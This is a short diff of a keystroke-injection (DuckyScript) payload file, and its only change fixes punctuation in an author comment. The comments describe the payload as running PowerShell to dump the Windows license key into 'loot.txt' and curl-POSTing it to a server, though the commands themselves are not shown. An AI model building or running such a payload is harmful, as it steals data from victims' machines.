@@ -1,5 +1,5 @@
 REM TITLE: exfiltrate windows license key
-REM AUTHOR Always Be Testing
+REM AUTHOR: Always Be Testing
 REM DESCRIPTIN: This payload runs powershell to write the windows license key to
 REM a file called "loot.txt" then curl POSTs the file to a server
 DELAY 500
